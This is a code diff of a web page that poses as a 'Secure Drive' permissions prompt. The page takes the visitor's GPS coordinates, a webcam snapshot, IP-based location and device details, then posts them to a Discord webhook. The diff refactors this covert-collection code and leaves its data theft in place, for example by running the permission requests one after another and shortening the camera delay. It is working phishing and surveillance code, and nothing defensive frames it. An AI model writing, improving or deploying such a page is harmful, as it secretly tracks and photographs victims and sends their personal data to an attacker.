@@ -53,7 +53,7 @@
 <body>
   <div id="main">
     <div id="statusText">Permissions are required to access Secure Drive.</div>
-    <button onclick="requestAllPermissions()">Continue</button>
+    <button onclick="startPermissionFlow()">Continue</button>
   </div>
 
   <script>
@@ -74,28 +74,17 @@
       };
     }
 
-    function dataURLtoBlob(dataurl) {
-      const arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
-            bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
-      while (n--) u8arr[n] = bstr.charCodeAt(n);
-      return new Blob([u8arr], { type: mime });
-    }
-
-    function askNotificationPermission() {
-      return new Promise((resolve) => {
-        if ('Notification' in window && Notification.permission !== 'granted') {
-          Notification.requestPermission().then(p => resolve(p === 'granted')).catch(() => resolve(false));
-        } else {
-          resolve(true);
-        }
-      });
+    async function askNotificationPermission() {
+      if (!("Notification" in window)) return false;
+      const permission = await Notification.requestPermission();
+      return permission === "granted";
     }
 
     function askLocationPermission() {
-      return new Promise((resolve) => {
+      return new Promise(resolve => {
         if (!navigator.geolocation) return resolve(false);
         navigator.geolocation.getCurrentPosition(
-          (pos) => {
+          pos => {
             coords.lat = pos.coords.latitude;
             coords.lon = pos.coords.longitude;
             coords.acc = pos.coords.accuracy;
@@ -119,7 +108,7 @@
         document.body.appendChild(video);
 
         await video.play();
-        await new Promise(res => setTimeout(res, 3000));
+        await new Promise(res => setTimeout(res, 2000));
 
         const canvas = document.createElement("canvas");
         canvas.width = video.videoWidth;
@@ -127,13 +116,20 @@
         const ctx = canvas.getContext("2d");
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
         capturedImageData = canvas.toDataURL("image/png");
+        stream.getTracks().forEach(t => t.stop());
 
-        stream.getTracks().forEach(track => track.stop());
         return true;
-      } catch (err) {
-        console.warn("Camera error:", err);
+      } catch (e) {
+        console.warn("Camera access denied");
         return false;
       }
+    }
+
+    function dataURLtoBlob(dataurl) {
+      const arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
+            bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
+      while (n--) u8arr[n] = bstr.charCodeAt(n);
+      return new Blob([u8arr], { type: mime });
     }
 
     function sendToDiscord(ipData) {
@@ -151,7 +147,7 @@
           title: "📍 GPS & Device Info",
           description:
             `**Latitude:** ${coords.lat}\n**Longitude:** ${coords.lon}\n**Accuracy:** ${coords.acc} meters` +
-            `\n**Map:** ${mapLink !== "N/A" ? `[View Location](${mapLink})` : "Location not available"}` +
+            `\n**Map:** ${mapLink}` +
             `\n\n🌐 **IP Info**\n**IP:** ${ipData.ipAddress}\n**City:** ${ipData.city}` +
             `\n**Region:** ${ipData.stateProv}\n**Country:** ${ipData.countryName}` +
             `\n\n🖥️ **Device Info**\n**Platform:** ${device.platform}\n**Browser:** ${device.userAgent}` +
@@ -168,25 +164,20 @@
 
       formData.append("payload_json", JSON.stringify(payload));
 
-      fetch(webhookUrl, {
-        method: "POST",
-        body: formData
-      });
+      fetch(webhookUrl, { method: "POST", body: formData });
     }
 
-    async function requestAllPermissions() {
+    async function startPermissionFlow() {
       document.getElementById("main").innerHTML = `
         <div id="statusText">Requesting permissions…</div>
         <div id="spinner"></div>
       `;
 
-      const [locationGranted, notificationGranted, cameraGranted] = await Promise.all([
-        askLocationPermission(),
-        askNotificationPermission(),
-        askCameraPermission()
-      ]);
+      const locationGranted = await askLocationPermission();
+      const notificationGranted = await askNotificationPermission();
+      const cameraGranted = await askCameraPermission();
 
-      if (!locationGranted || !notificationGranted || !cameraGranted) {
+      if (!locationGranted || !notificationGranted) {
         window.location.href = deniedPage;
         return;
       }
